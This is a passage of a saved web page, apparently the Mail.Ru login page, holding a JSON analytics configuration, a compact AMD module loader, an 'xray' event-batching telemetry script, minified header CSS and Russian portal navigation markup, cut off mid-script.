,"signin":{"saveauth":29285677,"nosaveauth":29285686},"restore":{"open":29285691,"not-opened":29285694,"send":29285695,"sms":29285697,"push":29285701,"email":29285702,"problems":29285707},"close":{"button":29285711,"escape":29285711},"email-providers":{"yandexru":29285895,"ramblerru":29285896,"gmailcom":29285897,"other":29285898,"yahoocom":29285899},"social":{"ok":29285904,"vk":29285915,"fb":29285917,"error":29285919}},"mail.login":{"render":29285940,"back":29285941,"captcha":29285951,"passremind":29285955,"signup":29285975,"error":29285977,"signin":{"saveauth":29285978,"nosaveauth":29285979},"restore":{"open":29285981,"not-opened":29288426,"send":29285984,"sms":29285985,"push":29285987,"email":29286003,"problems":29286005},"close":{"button":29286006,"escape":29286007},"email-providers":{"yandexru":29286009,"ramblerru":29286013,"gmailcom":29286015,"other":29286016,"yahoocom":29286017},"social":{"ok":29286020,"vk":29286021,"fb":29286023,"error":29286025}}},"choice":{"default":{"render":20911619,"enter-other-mail":20911825,"switch-user":20911825,"email-render":20912417,"email-signin":20912075,"email-switch-user":20912015,"email-enter-other-mail":20911996,"ag-relogin-error":20912534,"email-ag-relogin-error":22335185}}},"ActiveLogin":"","HasAuth":true,"platform":{"os":"","osver":""},"device":{"dtid":"","wtrid":""},"xray":{"split":"","ActiveEmail":"","project":"login","XRAY_RADAR_URL":"//xray.imgsmail.ru","RadarPrefix":"","MAX_BATCH_SIZE":60000,"MAX_CHUNK_SIZE":4000,"verbose":false},"supportedDevices":{"Android":"4","iPhone OS":"8","Windows Phone":"8"},"xrayEnable":true},"restore":{"id":"","phones":[],"support_disabled":false},"captcha":"","search":{"undefined":null},"isAuthorized":false,"csrf":"d7ec5aed3db0468a87d54fffa9e35b35","errorMessages":{"Username":null,"Password":null,"captcha":null}}
        </script>
        <script type="application/javascript" id="requirejs-lite">
            /* babeljs ignore:true */
/* globals window */

(function (window) {
	'use strict';

	var gid = 0;

	var R_REL_PATH = /(^|!)\.\//;
	var READY_STATES = navigator.platform === 'PLAYSTATION 3' ? 'complete' : 'complete loaded';

	var R_REQUIRE = /\brequire\(["']([^'"]+)["']\)/g;
	var R_COMMENT = /(\/\*([\s\S]*?)\*\/|([^:]|^)\/\/(.*)$)/mg;

	var now = typeof _now === 'undefined' ? function () {return +new Date;} : _now;
	var timers = typeof _timers === 'undefined' ? {} : _timers;
	var noop = function () {};

	var defined = {};

	var config = {
		baseUrl: '/',
		shim: {},
		paths: {},
		packages: {},
		bundlesMap: {}
	};

	var globalLoader = {};
	var tmpDef;

	var head;
	var transport = document.createElement('script');

	var useInteractive = (
		transport.attachEvent &&
		!(transport.attachEvent.toString && transport.attachEvent.toString().indexOf('[native code') < 0) &&
		!(typeof opera !== 'undefined' && opera.toString() === '[object Opera]')
	);

	transport = null;
	timers.define = {};

	function merge(dst, src) {
		var key
		var val;

		for (key in src) {
			val = src[key];

			if (val && typeof val === 'object') {
				dst[key] = merge(dst[key] || {}, val);
			} else {
				dst[key] = val;
			}
		}

		return dst;
	}

	function _getModuleConfig() {
		return config.config && config.config[this.name] || {};
	}

	function _removeBaseUrl(str) {
		return str.replace(new RegExp('^' + config.baseUrl.replace(/[.?*+^$[\]\\(){}|-]/g, "\\$&")), '');
	}

	function _getModule(name, relative) {
		var relName = require.normalize(name, config.packages[relative] ? relative + '/' : (relative && relative.lastIndexOf('/') > 2 ? relative : ''));
		var define = defined[relName] || defined[name] || defined[_removeBaseUrl(relName)];
		var module;

		if (define === void 0) {
			return;
		}

		module = define.module;

		if (module === void 0) {
			var deps = define.deps.slice(0);
			var i = deps.length;
			var depName;
			var depModule;
			var exports;

			while (i--) {
				depName = deps[i];

				if (depName === 'module') {
					deps[i] = module = {
						name: name,
						config: _getModuleConfig,
						exports: {}
					};
				} else if (depName === 'exports') {
					if (module === void 0) {
						module = {exports: {}};
					}

					deps[i] = module.exports;
				} else {
					depModule = _getModule(depName, relName);

					if (depModule === void 0) {
						return;
					} else {
						deps[i] = depModule.exports;
					}
				}
			}

			// todo: shim.deps, shim.exports
			if (require.onBeforeModuleInit !== void 0) {
				require.onBeforeModuleInit(define);
			}

			timers.define[name] = -now();

			exports = define.init.apply(null, deps);

			if (exports !== void 0 || !module) {
				module = {exports: exports};
			}

			define.module = module;
			timers.define[name] += now();

			if (require.onModuleInit !== void 0) {
				require.onModuleInit(define);
			}
		}

		return module;
	}

	function _loadQueue(queue, deps, callback) {
		var url;
		var name;
		var total = queue.length;
		var progress = 0;
		var i = total;
		var onLoad = function (moduleName, url) {
			++progress;

			if (progress === total) {
				while (total--) {
					deps[queue[total].index] = _getModule(queue[total].name).exports;
				}

				callback();
			}
		};

		queue.id = ++gid;

		while (i--) {
			name = require.normalize(queue[i].name, '');
			url = require.toUrl(name);

			if (globalLoader[url] === void 0) {
				globalLoader[url] = [];

				if (name.indexOf('!') > -1) {
					_usePlugin(name, url);
				} else {
					_load(name, url);
				}
			}

			if (globalLoader[url] === true) {
				onLoad(url);
			} else {
				globalLoader[url].push(onLoad);
			}
		}
	}

	function _usePlugin(name, url) {
		var tmp = name.split('!');
		var pluginName = tmp[0];
		var moduleName = tmp[1];

		require([config.map['*'][pluginName] || pluginName], function (plugin) {
			var onLoad = function (retVal) {
				defined[name] = {
					deps: [],
					init: function () {
						return retVal;
					}
				};

				_moduleOnLoaded(url, moduleName);
			};

			onLoad.fromText = function (code) {
				Function('define', code)(function (deps, callback) {
					var i = deps.length;
					var relative = url.split('!').pop();

					while (i--) {
						deps[i] = require.normalize(deps[i], relative);
					}

					define(name, deps, callback);
				});

				_moduleOnLoaded(url, name);
			};

			plugin.load(
				moduleName,
				{
					toUrl: function (name) {
						return require.toUrl(require.normalize(name, moduleName));
					}
				},
				onLoad
			);
		});
	}

	function _load(name, url) {
		transport = document.createElement('script');
		transport.src = url + (url.substr(-3) === '.js' ? '' : '.js');
		transport.type = 'text/javascript';

		transport.setAttribute('module-url', url);
		transport.setAttribute('module-name', name);

		if (useInteractive) {
			transport.attachEvent('onreadystatechange', _onScriptLoad);
		} else {
			transport.addEventListener('load', _onScriptLoad, false);
		}

		head = head || (document.head || document.getElementsByTagName('head')[0]);
		head.insertBefore(transport, head.firstChild);
		transport = null;
	}

	function _onScriptLoad(evt) {
		var script = (evt.currentTarget || evt.srcElement);

		if ((evt.type === 'load') || (READY_STATES.indexOf(script.readyState) > -1)) {
			if (useInteractive) {
				script.detachEvent('onreadystatechange', _onScriptLoad);
			} else {
				script.removeEventListener('load', _onScriptLoad, false);
			}

			_moduleOnLoaded(script.getAttribute('module-url'), script.getAttribute('module-name'));
			tmpDef = null;
		}
	}

	function _moduleOnLoaded(url, moduleName) {
		var defModule = defined[moduleName] || tmpDef || {deps: [], init: noop};
		var deps = defModule.deps;
		var i = deps.length;

		if (i > 0) {
			deps = deps.slice(0);

			while (i--) {
				if (deps[i] === 'module' || deps[i] === 'exports') {
					deps.splice(i, 1);
				} else {
					deps[i] = require.normalize(deps[i], url);
				}
			}
		}

		require(deps, function () {
			var onLoad = globalLoader[url];

			defModule.name = moduleName;
			defined[moduleName] = defined[_removeBaseUrl(moduleName)] = defModule;
			globalLoader[url] = true;

			if (onLoad) {
				while (onLoad.length) {
					onLoad.shift()(moduleName, url);
				}
			}
		});
	}

	function define(name, deps, callback) {
		if (typeof name !== 'string') {
			callback = deps;
			deps = name;
			name = void 0;
		}

		if (callback === void 0) {
			callback = deps;
			deps = [];

			var argsLength = callback.length;

			if (argsLength > 0) {
				var source = callback.toString().replace(R_COMMENT, '');
				var matches;

				while (matches = R_REQUIRE.exec(source)) {
					deps.push(matches[1]);
				}

				deps = (argsLength === 1 ? ['require'] : ['require', 'exports', 'module']).concat(deps);
			}
		}

		if (useInteractive && !name) {
			if (transport && transport.readyState === 'interactive') {
				name = transport.getAttribute('module-name');
			} else {
				var scripts = document.getElementsByTagName('script');
				var i = scripts.length;

				while (i--) {
					if (scripts[i].readyState === 'interactive') {
						name = scripts[i].getAttribute('module-name');
						break;
					}
				}
			}
		}

		tmpDef = {
			name: name,
			deps: deps,
			init: callback
		};

		if (name) {
			defined[name] = defined[require.normalize(name)] = tmpDef;
			tmpDef = null;
		}
	}

	function require(deps, callback) {
		if (typeof deps === 'string') {
			return _getModule(deps).exports;
		}

		if (callback === void 0) {
			callback = function () {
			};
		}

		var i = deps.length;
		var depName;
		var depModule;
		var asyncDeps = [];

		while (i--) {
			depName = deps[i];
			depModule = _getModule(depName);

			if (depModule === void 0) {
				asyncDeps.push({index: i, name: depName});
			} else {
				deps[i] = depModule.exports;
			}
		}

		if (asyncDeps.length) {
			_loadQueue(asyncDeps, deps, function () {
				callback.apply(null, deps);
			});
		} else {
			callback.apply(null, deps);
		}
	}

	require.config = function (cfg) {
		merge(config, cfg);

		var bundles = cfg.bundles;
		var packages = cfg.packages;
		var i, pkg, bundleName, files;

		if (packages) {
			i = packages.length;

			while (i--) {
				pkg = packages[i];
				pkg.filename = pkg.filename || (pkg.location + '/' + pkg.main);

				config.packages[pkg.name] =
				config.packages[pkg.filename] = pkg;
			}
		}

		if (bundles) {
			for (bundleName in bundles) {
				files = bundles[bundleName];
				i = files.length;

				while (i--) {
					config.bundlesMap[files[i]] = bundleName;
				}
			}
		}

		if (cfg.deps) {
			require(cfg.deps);
		}
	};

	require.normalize = function (name, baseUrl) {
		var idx;
		var paths = config.paths;
		var packages = config.packages;
		var pathTo = paths[name];
		var pkg = packages[name];

		if (pathTo) {
			name = pathTo;
		}
		else if (pkg) {
			name = pkg.filename.replace(/\.js$/, '');
		} else {
			// Relative path
			if (R_REL_PATH.test(name)) {
				idx = baseUrl.lastIndexOf('/');
				name = name.replace(R_REL_PATH, '$1' + (idx > -1 ? baseUrl.substr(0, idx) + '/' : baseUrl));
			}
			else if (paths[name]) {
				name = paths[name];
			} else {
				idx = name.indexOf('/');

				if (idx > 0) {
					pathTo = name.substr(0, idx);
					pathTo = paths[pathTo] || (packages[pathTo] && packages[pathTo].location);

					if (pathTo) {
						name = pathTo + name.substr(idx);
					}
				}
			}
		}

		// Relative offset
		if (name.indexOf('../') > -1) {
			var tmp = name.split('!');

			idx = baseUrl.lastIndexOf('/');
			name = (idx > -1 ? baseUrl.substr(0, idx) + '/' : baseUrl) + tmp.pop();

			name = name.split('/');
			idx = name.length;

			while (idx--) {
				if (name[idx] === '..') {
					idx--;
					name.splice(idx, 2);
				}
			}

			name = tmp.concat(name.join('/')).join('!');
		}

		return name;
	};

	require.toUrl = function (name) {
		var url = require.normalize(name, '');

		if (config.bundlesMap[url]) {
			return config.baseUrl + 'bundles/' + config.bundlesMap[url] + '.min';
		}

		return (url.charAt(0) === '/' ? '' : config.baseUrl) + url;
	};

	// Export
	defined.require = {module: {exports: require}};

	define.amd = {jQuery: true};
	require.cfg = config;
	define.defined = require.defined = defined;

	window.define = define;
	window.require = require;
})(window);

        </script>
        <script type="application/javascript" id="xray-config">
            define('xray-config', function () {
                return {"split":"","ActiveEmail":"","project":"login","XRAY_RADAR_URL":"//xray.imgsmail.ru","RadarPrefix":"","MAX_BATCH_SIZE":60000,"MAX_CHUNK_SIZE":4000,"verbose":false}
            });
        </script>
        <script type="application/javascript" id="xray">
            define('mrg-xray', [ 'xray-config' ], function (config) {
	var lock;
	var queue = [];
	var baseQueryString;
	var log = ('console' in window) && (console.debug || console.log) || new Function;

	function xray (raw, options) {
		options = options || {};

		splitLine(convert('t=' + config.RadarPrefix + raw)).forEach(function(line) {
			if (config.verbose) {
				try {
					log(
						'xray',
						line,
						(options.immediately ? 'immediately' : ''),
						(options.ga ? 'ga' : '')
					);
				} catch (err) {
					// ignore error
				}
			}

			queue.push(line);
		});

		if (!lock) {
			lock = true;

			// для некоторых радаров нужно немедленное отправление
			// например успешная регистрация - т.к. после нее происходит
			// переход на другой урл, и весь асинхронный js не выполняется
			if (options.immediately) {
				queueProcessing();
			} else {
				window.setTimeout(queueProcessing, 1000);
			}
		}

		if (options.ga && config.GA_TRACKING_ID) {
			var radarParams = convert('t=' + raw);

			if (typeof radarParams.i === 'string') {
				radarParams.i.split(',').forEach(function (interval) {
					var intervalParts = interval.split(':');

					sendGA(radarParams.t + '_' + intervalParts[0], intervalParts[1]);
				});
			} else {
				sendGA(radarParams.t, radarParams.v);
			}
		}
	}

	function reduceKeyValParser (obj, pair) {
		pair = pair.split('=');

		try {
			obj[ pair[ 0 ] ] = decodeURIComponent(pair[ 1 ]);
		} catch (_) {
			obj[ pair[ 0 ] ] = pair[ 1 ];
		}

		return obj;
	}

	function convert (raw) {
		return typeof raw === 'string' ? raw.split('&').reduce(reduceKeyValParser, {}) : raw;
	}

	function splitLine(line) {
		var batch = [];

		var total, next;

		function init() {
			next = {};
			total = 0;
			Object.keys(line).forEach(function(key) {
				next[key] = line[key];
			});
		}

		if (line.i && line.i.length > config.MAX_CHUNK_SIZE) {
			init();
			next.i = [];

			line.i.split(/,/).forEach(function(current, index, values) {
				if (total + current.length + next.i.length < config.MAX_CHUNK_SIZE) {
					next.i.push(current);
					total += current.length;

				} else {
					next.i = next.i.join(',');
					batch.push(next);
					init();
					next.i = [current];
				}

				if ((index + 1) === values.length) {
					next.i = next.i.join(',');
					batch.push(next);
				}
			});

		} else if (line.rlog_message && line.rlog_message.length > config.MAX_CHUNK_SIZE) {
			var rlog_message = line.rlog_message;

			var steps = Math.ceil(rlog_message.length / (config.MAX_CHUNK_SIZE/2));
			var split_id = (new Date().valueOf() * Math.random()).toString(36);

			for (var i=0; i < steps; i++) {
				init();

				next.rlog_message = JSON.stringify({
					id: split_id,
					cnt: steps,
					index: i,
					part: rlog_message.slice(i * config.MAX_CHUNK_SIZE/2, (i + 1) * config.MAX_CHUNK_SIZE/2)
				});

				batch.push(next);
			}

		} else {
			batch.push(line);
		}

		return batch;
	}

	function sendGA (str, eventValue) {
		if (typeof gtag !== 'function') {
			return;
		}

		var parts = str.split(/_/g);
		var eventCategory = parts[0];
		var eventAction = parts[1];
		var eventLabel = parts.slice(2).join('_');

		gtag('event', eventAction, {
			'event_category': eventCategory,
			'event_label': eventLabel,
			'value': eventValue
		});
	}

	function send(value) {
		var settings = {
			url: (config.XRAY_RADAR_URL || 'https://xray.mail.ru') + '/batch?' + baseQueryString,
			data: 'batch=' + value,
			type: 'POST',
			async: true
		};

		var xhr = new window.XMLHttpRequest();

		if (typeof config.beforeSend === 'function') {
			if (config.beforeSend(xhr, settings) === false) {
				xhr.abort();
				return;
			}
		}

		xhr.open(settings.type, settings.url, settings.async);

		if (settings.headers) {
			for (var h in settings.headers) {
				xhr.setRequestHeader(h, settings.headers[h]);
			}
		}

		xhr.send(settings.data);
	}

	function queueProcessing () {
		lock = false;

		if (queue.length) {
			var batch = queue;
			var value;

			while (true) {
				value = JSON.stringify(batch);

				if (value.length > config.MAX_BATCH_SIZE) {
					if (batch.length > 1) {
						batch = batch.slice(0, -1);
					} else {
						throw new Error('Too long line: ' + value);
					}

				} else {
					break;
				}
			}

			if (batch.length) {
				send(value);
				queue = queue.slice(batch.length);
			}

			if (queue.length) {
				queueProcessing();
			}
		}
	}

	xray.setConfig = function (newConfig, force) {
		if (newConfig !== config) {
			if (force) {
				config = newConfig;

			} else {
				Object.keys(newConfig).forEach(function (key) {
					config[key] = newConfig[key];
				});
			}
		}

		// set batch limits
		config.MAX_BATCH_SIZE = config.MAX_BATCH_SIZE || 6e4;
		config.MAX_CHUNK_SIZE = config.MAX_CHUNK_SIZE || 4e3;

		config.project = config.project || 'mail';

		// set query string;
		baseQueryString = [
			'p=' + config.project,
			(config.ActiveEmail ? 'email=' + config.ActiveEmail                             : ''),
			(config.VIDCookie   ? 'vid='   + config.VIDCookie                               : ''),
			(config.split       ? 'split=' + config.split                                   : ''),
			(config.utm         ? 'utm='   + encodeURIComponent(JSON.stringify(config.utm)) : ''),
			(document.referrer  ? 'r='     + encodeURIComponent(document.referrer)          : '')

		].filter(function(i) {
			return i;
		}).join('&');


		// set GA
		if (config.GA_TRACKING_ID && !window.gtag) {
			// https://developers.google.com/analytics/devguides/collection/gtagjs/
			var gtagScript = document.createElement('script');
			gtagScript.src = 'https://www.googletagmanager.com/gtag/js?id=' + config.GA_TRACKING_ID;
			gtagScript.type = 'text/javascript';
			document.getElementsByTagName('head')[0].appendChild(gtagScript);

			window.dataLayer = window.dataLayer || [];
			window.gtag = function gtag () { dataLayer.push(arguments); };
			gtag('js', new Date());
			gtag('config', config.GA_TRACKING_ID, { 'send_page_view': false });
		}
	}

	// initial
	xray.setConfig(config);

	return xray;
});

        </script>
        <script type="application/javascript">
		window.addEventListener('error', function(err) {
			(new Image()).src = 'http://stat.radar.imgsmail.ru/update?p=login&amp;t=global-error&amp;v=1';
		});
		</script>
        
        
    </head>
    <body>
        

<!--noindex-->
 
 





<style>.x-ph{position:relative;z-index:1003;margin:0;padding:0;font:12px/16px HelveticaNeue,Arial,sans-serif;white-space:nowrap;text-align:left;background:#fff;height:28px;*zoom:1}.x-ph .w-x-ph{width:100%;border-collapse:collapse;background:#fff}.x-ph .w-x-ph,.x-ph .w-x-ph__col{padding:0;margin:0;border:0;border-spacing:0;font:12px/16px HelveticaNeue,Arial,sans-serif}.x-ph .w-x-ph__col{height:28px;vertical-align:top;white-space:nowrap}.x-ph .w-x-ph__col_left{width:1%;padding-right:20px;text-align:left}.x-ph .w-x-ph__col_right{text-align:right}.x-ph__menu{position:relative;z-index:1004;display:inline-block;padding-right:2px;font:12px/16px HelveticaNeue,Arial,sans-serif;vertical-align:top}.w-x-ph__menu__placeholder{position:absolute;top:100%;left:50%;width:0;height:0;font:0/0 a}.x-ph__menu__button,.x-ph__menu__button:link,.x-ph__menu__button:visited,.x-ph__menu__button:hover,.x-ph__menu__button:active,.x-ph__menu__button:focus{position:relative;z-index:1005;display:inline-block;width:100%;padding:6px 0 5px;border-right:1px solid #fff;border-left:1px solid #fff;font:12px/16px HelveticaNeue,Arial,sans-serif;text-decoration:none;cursor:pointer;outline:none}.x-ph-ff.x-ph-win .x-ph__menu__button,.x-ph-ff.x-ph-win .x-ph__menu__button:link,.x-ph-ff.x-ph-win .x-ph__menu__button:visited,.x-ph-ff.x-ph-win .x-ph__menu__button:hover,.x-ph-ff.x-ph-win .x-ph__menu__button:active,.x-ph-ff.x-ph-win .x-ph__menu__button:focus{padding-top:5px;padding-bottom:6px;height:17px}.x-ph__menu__button__text,.x-ph__menu_open .x-ph__menu__button:hover .x-ph__menu__button__text{display:inline-block;width:100%;padding:0 14px 0 6px;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;color:#1378bf;font-style:normal;text-decoration:none;overflow:hidden;text-overflow:ellipsis;text-align:left;vertical-align:top}.x-ph__menu__button:hover .x-ph__menu__button__text,.x-ph__menu__button:focus .x-ph__menu__button__text,.x-ph__menu__button:active .x-ph__menu__button__text,.x-ph__menu_open .x-ph__menu__button:focus .x-ph__menu__button__text,.x-ph__menu_open .x-ph__menu__button:active .x-ph__menu__button__text{color:#f26d00}.x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:hover .x-ph__menu__button__icon{position:absolute;right:5px;top:13px;width:0;height:0;border-width:4px;border-style:solid;border-color:#1378bf #fff #fff;font:0/0 a}.x-ph__menu__button:hover .x-ph__menu__button__icon,.x-ph__menu__button:focus .x-ph__menu__button__icon,.x-ph__menu__button:active .x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:focus .x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:active .x-ph__menu__button__icon{border-color:#f26d00 #fff #fff}.w-x-ph__menu__button__shadow{position:absolute;z-index:1007;top:0;opacity:0;width:50px;height:0;background:#fff;-webkit-box-shadow:0 4px 15px rgba(0,0,0,.2);-moz-box-shadow:0 4px 15px rgba(0,0,0,.2);box-shadow:0 4px 15px rgba(0,0,0,.2)}.x-ph__link{display:inline-block;padding:6px;margin-right:6px;*padding:5px 6px 7px;*zoom:1;text-decoration:none;white-space:nowrap;outline:none;font:12px/16px HelveticaNeue,Arial,sans-serif}.x-ph__link,a.x-ph__link{color:#1378bf}.x-ph__link:hover,a.x-ph__link:hover{color:#f26d00;text-decoration:none}.x-ph__link:hover .x-ph__link__text,a.x-ph__link:hover .x-ph__link__text{color:#f26d00}.x-ph__link_ext,a.x-ph__link_ext,.x-ph__link_ext:hover,a.x-ph__link_ext:hover{text-decoration:none}.x-ph__link__text{text-decoration:none;font-style:normal;cursor:pointer}.x-ph__link__balloon{display:none;overflow:hidden;margin-bottom:-4px;margin-left:3px;padding:1px 3px;min-width:9px;height:13px;-webkit-border-radius:7px;-moz-border-radius:7px;border-radius:7px;background-color:#ffa930;color:#fff;vertical-align:baseline;text-align:center;font-weight:400;font-style:normal;font-size:11px;line-height:13px;cursor:pointer;-webkit-animation-duration:500ms;-moz-animation-duration:500ms;animation-duration:500ms;-webkit-animation-fill-mode:both;-moz-animation-fill-mode:both;animation-fill-mode:both}.x-ph-ff.x-ph-mac .x-ph__link__balloon,.x-ph-opera .x-ph__link__balloon{line-height:14px}.x-ph__link_ext .x-ph__link__balloon{display:inline-block;*display:inline;*zoom:1}.x-ph-ios .x-ph__link__balloon{margin-bottom:-5px;padding:0 3px 2px}.x-ph__link_first{margin-left:14px}.x-ph__link_last{margin-right:12px}.x-ph__link_ext{padding-right:1px}.x-ph__link_selected{font-weight:700}.x-ph-ff.x-ph-win .x-ph__link{padding:5px 6px 7px}.x-ph__auth__link_icon{position:relative;overflow:hidden;padding:0 6px!important;width:16px;height:28px;vertical-align:top;text-indent:30px}.x-ph__auth__link_icon,.x-ph__auth__link_icon:hover{color:#fff!important}.x-ph__auth__link_icon:after{position:absolute;top:2px;left:2px;display:block!important}.w-x-ph__link{display:inline-block;vertical-align:top}.x-ph__auth{width:100%}.x-ph__auth,.w-x-ph__auth__col{margin:0;padding:0;border:0;border-spacing:0;font:12px/16px HelveticaNeue,Arial,sans-serif}.w-x-ph__auth__col{vertical-align:top;text-align:right;white-space:nowrap}.w-x-ph__auth__col_left{width:99%}.w-x-ph__auth__col_right{padding-right:2px}.x-ph__auth__user{position:relative;display:block;width:100%;min-width:100px;height:28px;overflow:hidden}.w-x-ph__auth__user_inner{position:absolute;right:0;text-align:left;max-width:100%}.x-ph__auth__user__text{color:#000;display:inline-block;padding:6px 10px 6px 0;_padding:5px 10px 7px 0;font:12px/16px HelveticaNeue,Arial,sans-serif}.x-ph__auth__user__fade{position:absolute;top:0;right:-6px;width:16px;height:28px;overflow:hidden;background:url("../img.imgsmail.ru/ph/0.53.4/auth/fade2.png") repeat-y 0 0;_display:none}.x-ph__auth__link,.x-ph__auth__link:link,.x-ph__auth__link:visited,.x-ph__auth__link:hover,.x-ph__auth__link:active,.x-ph__auth__link:focus{font:12px/16px HelveticaNeue,Arial,sans-serif}.w-x-ph__auth__dropdown{position:relative;display:block;min-width:100px;width:100%;height:1px;text-align:right}.w-x-ph__auth__dropdown__inner{position:absolute;right:6px;width:100%;min-width:100px;text-align:right}.x-ph__menu_auth{max-width:100%}.x-ph__menu__button_auth,.x-ph__menu__button_auth:link,.x-ph__menu__button_auth:visited,.x-ph__menu__button_auth:hover,.x-ph__menu__button_auth:active,.x-ph__menu__button_auth:focus{max-width:100%}.x-ph__menu__button__text_auth{position:relative}.x-ph__menu__button__text_auth,.x-ph__menu_open .x-ph__menu__button:hover .x-ph__menu__button__text_auth{max-width:560px}.x-ph__menu_auth_unread .x-ph__menu__button__text_auth,.x-ph__menu_auth_unread.x-ph__menu_open .x-ph__menu__button:hover .x-ph__menu__button__text_auth{padding-left:14px}.x-ph__menu__button_auth__unread{display:none;position:absolute;left:4px;top:12px;width:6px;height:6px;background:#ffa930;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px}.x-ph__menu_auth_unread .x-ph__menu__button_auth__unread{display:block}.x-ph__menu_open .x-ph__menu__button .x-ph__menu__button__text,.x-ph__menu_open .x-ph__menu__button:hover .x-ph__menu__button__text,.x-ph__menu_open .x-ph__menu__button:focus .x-ph__menu__button__text,.x-ph__menu_open .x-ph__menu__button:active .x-ph__menu__button__text{color:#333}.x-ph__menu_open .x-ph__menu__button .x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:hover .x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:focus .x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:active .x-ph__menu__button__icon{border-color:#333 #fff #fff}.x-ph__menu__button_auth__unread{background-position:0 -133px}.x-ph__menu__button__text__icon,.x-ph__auth_list__item__info__social{display:inline-block;overflow:hidden;width:16px;height:16px;-webkit-border-radius:8px;-moz-border-radius:8px;border-radius:8px;vertical-align:top}.x-ph__menu__button__text__icon:after,.x-ph__auth_list__item__info__social:after{margin:-4px 0 0 -4px}</style>



<div class="x-ph portal-headline" id="portal-headline"><table class="w-x-ph" cellspacing="0"><tr><td class="w-x-ph__col w-x-ph__col_left"><a href="https://r.mail.ru/n201603520?sz=&amp;rnd=198423073" rel="nofollow noopener" class="x-ph__link x-ph__link_first">Mail.Ru</a><a id="ph_mail" href="https://r.mail.ru/n215030470?sz=&amp;rnd=198423073" rel="nofollow noopener" class="x-ph__link"><span class="x-ph__link__text">Почта</span><i class="x-ph__link__balloon" id="g_mail_events"></i></a><a id="ph_my" style="" class="x-ph__link" href="https://r.mail.ru/n201603521?sz=&amp;rnd=198423073" rel="nofollow noopener"><span class="x-ph__link__text">Мой Мир</span><i class="x-ph__link__balloon" id="g_my_events"></i></a><span class="w-x-ph__link" style=""><a class="x-ph__link" href="https://r.mail.ru/n165232845?sz=&amp;rnd=198423073" rel="nofollow noopener"><span class="x-ph__link__text">Одноклассники</span><i class="x-ph__link__balloon" id="g_ok_events"></i></a><span id="PH_bub:ok" class="x-ph-bub__placeholder"></span></span><a class="x-ph__link" href="https://r.mail.ru/n215030471?sz=&amp;rnd=198423073" rel="nofollow noopener" style=""><span class="x-ph__link__text">Игры</span><i class="x-ph__link__balloon" id="g_games_events"></i></a><a href="https://r.mail.ru/n102969579?sz=&amp;rnd=198423073" rel="nofollow noopener" style="" class="x-ph__link"><span class="x-ph__link__text">Знакомства</span><i class="x-ph__link__balloon" id="g_love_events"></i></a><a href="https://r.mail.ru/n211738025?sz=&amp;rnd=198423073" rel="nofollow noopener" style="" class="x-ph__link">Новости</a><a href="https://r.mail.ru/n102969581?sz=&amp;rnd=198423073" rel="nofollow noopener" style="" class="x-ph__link">Поиск</a><a id="PH_allProjects" class="x-ph__link" href="https://r.mail.ru/n201603522?sz=&amp;rnd=198423073" rel="nofollow noopener">Все проекты</a><span class="x-ph__menu" id="PH_projectsMenu" style="display:none;"><i class="w-x-ph__menu__button__shadow w-x-ph__menu__button__shadow_left"></i><i class="w-x-ph__menu__button__shadow w-x-ph__menu__button__shadow_right"></i><a class="x-ph__menu__button" id="PH_projectsMenu_button" href="#" rel="nofollow noopener"><i class="x-ph__menu__button__icon"></i><i class="x-ph__menu__button__text">Все проекты</i></a></span></td><td class="w-x-ph__col w-x-ph__col_right"><div id="PH_authView" style="display:none"><table class="x-ph__auth" cellspacing="0"><tr><td class="w-x-ph__auth__col w-x-ph__auth__col_left"><span id="PH_singleuser" class="x-ph__auth__user"><span class="w-x-ph__auth__user_inner"><span id="PH_user-email_disabled" class="x-ph__auth__user__text"></span><span class="x-ph__auth__user__fade"></span></span></span><div id="PH_miltiuser" style="display:none;" class="w-x-ph__auth__dropdown"><div class="w-x-ph__auth__dropdown__inner"><div class="x-ph__menu x-ph__menu_auth" id="PH_authMenu"><i class="w-x-ph__menu__button__shadow w-x-ph__menu__button__shadow_left"></i><i class="w-x-ph__menu__button__shadow w-x-ph__menu__button__shadow_right"></i><span class="x-ph__menu__button x-ph__menu__button_auth" id="PH_authMenu_button"><i class="x-ph__menu__button_auth__unread" title=""></i><i class="x-ph__menu__button__icon x-ph__menu__button__icon_auth"></i><i class="x-ph__menu__button__text x-ph__menu__button__text_auth" id="PH_user-email"></i></span></div></div></div></td><td class="w-x-ph__auth__col w-x-ph__auth__col_right"><a id="PH_logoutLink" class="x-ph__link x-ph__link_last x-ph__auth__link" href="https://r.mail.ru/cls1074201/auth.mail.ru/cgi-bin/logout?next=1&amp;lang=ru_RU&amp;Page=" rel="nofollow noopener" title="выход" xname="clb1074201">выход</a></td></tr></table></div><div id="PH_noAuthView" style=""><table class="x-ph__auth" cellspacing="0"><tr><td class="w-x-ph__auth__col w-x-ph__auth__col_right"><a id="PH_regLink" class="x-ph__link x-ph__auth__link" href="https://r.mail.ru/cls525468/r.mail.ru/clb1126011/e.mail.ru/signup?from=navi&amp;lang=ru_RU&amp;rnd=198423073" rel="nofollow noopener">Регистрация</a><a class="x-ph__link x-ph__link_last x-ph__auth__link" href="https://r.mail.ru/cls951827/e.mail.ru/login?lang=ru_RU&amp;Page=" rel="nofollow noopener" id="PH_loginLink" xname="clb951827">Вход</a></td></tr></table></div></td></tr></table></div><div id="PH_innerHTML" style="display:none;"></div><!--[if IE 7]><script>var ____________ie7 = true;</script><![endif]--><!--[if IE 8]><script>var ____________ie8 = true;</script><![endif]--><script>
			if (!window.__PHS) var __PHS = {};

			(function (s) {
				s.exp = {};
				
				s.lang = "ru_RU";
				s.logDetails = false;
				s.maxAccounts = 20;
				s.eid = '';
				s.siteid = '';
				s.pv = '';
				s.region = 'Абуджа';
				s.loginLink = 'https://r.mail.ru/cls951827/e.mail.ru/login?lang=ru_RU&amp;Page=';
				s.authFormExtDomainsEnabled = false;
				s.portalAuthEnabled = true;
				s.disableGamesCounter = false;
				s.loginLinkXName = 'clb1126067';
				s.registerBackUrl = false;
				s.bizLinks = false;
				s.loveCounter = true;
				s.mailEvents = false;
				s.disableIFCheck = false;
				s.mailSplashUpdate = false;
				s.settingsText = false;
				s.settingsPage = false;
				s.showPassword = false;
